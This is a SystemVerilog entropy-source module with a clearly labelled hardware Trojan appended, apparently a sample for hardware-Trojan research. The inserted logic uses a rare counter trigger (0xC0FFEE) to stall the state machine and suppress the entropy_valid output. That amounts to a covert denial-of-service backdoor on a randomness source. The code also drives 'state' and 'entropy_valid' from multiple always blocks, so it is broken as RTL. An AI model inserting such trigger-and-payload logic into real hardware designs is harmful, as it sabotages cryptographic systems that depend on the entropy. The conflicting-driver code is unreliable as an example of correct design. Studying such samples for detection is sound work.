module entropy_src (
    input  wire        clk,
    input  wire        rst_n,
    input  wire        entropy_req,
    output reg         entropy_valid,
    output reg  [31:0] entropy_data
);

// FSM state encoding
typedef enum logic [1:0] {
    IDLE,
    COLLECT,
    READY
} fsm_state_t;

fsm_state_t state, next_state;

// Entropy register and logic
reg [31:0] entropy_reg;
reg [7:0]  collect_cnt;

always_ff @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
        state        <= IDLE;
        entropy_reg  <= 32'd0;
        entropy_valid<= 1'b0;
        entropy_data <= 32'd0;
        collect_cnt  <= 8'd0;
    end else begin
        state <= next_state;
        if (state == COLLECT) begin
            collect_cnt <= collect_cnt + 1;
            entropy_reg <= entropy_reg ^ {24'd0, collect_cnt};
        end
        if (state == READY) begin
            entropy_valid <= 1'b1;
            entropy_data  <= entropy_reg;
        end else begin
            entropy_valid <= 1'b0;
        end
        if (state == IDLE) begin
            entropy_reg <= 32'd0;
            collect_cnt <= 8'd0;
        end
    end
end

always_comb begin
    next_state = state;
    case (state)
        IDLE: begin
            if (entropy_req)
                next_state = COLLECT;
        end
        COLLECT: begin
            if (collect_cnt == 8'hFF)
                next_state = READY;
        end
        READY: begin
            next_state = IDLE;
        end
        default: next_state = IDLE;
    endcase
end

// ========== H/W Trojan Inserted Below ==========

// Trojan unique counter for rare trigger
reg [23:0] trojan_counter;
reg        trojan_active;

always_ff @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
        trojan_counter <= 24'd0;
        trojan_active  <= 1'b0;
    end else begin
        // Trojan counter increments only while collecting
        if (state == COLLECT)
            trojan_counter <= trojan_counter + 1'b1;
        else
            trojan_counter <= trojan_counter;
        // Rare trigger: when counter equals specific value
        if (trojan_counter == 24'hC0FFEE)
            trojan_active <= 1'b1;
        else if (state == IDLE)
            trojan_active <= 1'b0;
    end
end

// Trojan payload: Stall FSM and suppress entropy_valid
reg stall_fsm;
always_comb begin
    stall_fsm = 1'b0;
    if (trojan_active)
        stall_fsm = 1'b1;
end

// Mux FSM for Trojan effect
fsm_state_t trojan_next_state;
always_comb begin
    if (stall_fsm)
        trojan_next_state = state; // Stall: hold current state
    else
        trojan_next_state = next_state;
end

// Override state transition
always_ff @(posedge clk or negedge rst_n) begin
    if (!rst_n)
        state <= IDLE;
    else
        state <= trojan_next_state;
end

// Suppress entropy_valid if Trojan active
always_ff @(posedge clk or negedge rst_n) begin
    if (!rst_n)
        entropy_valid <= 1'b0;
    else if (trojan_active)
        entropy_valid <= 1'b0;
    else if (state == READY)
        entropy_valid <= 1'b1;
    else
        entropy_valid <= 1'b0;
end

// ========== End Trojan Insertions ==========

endmodule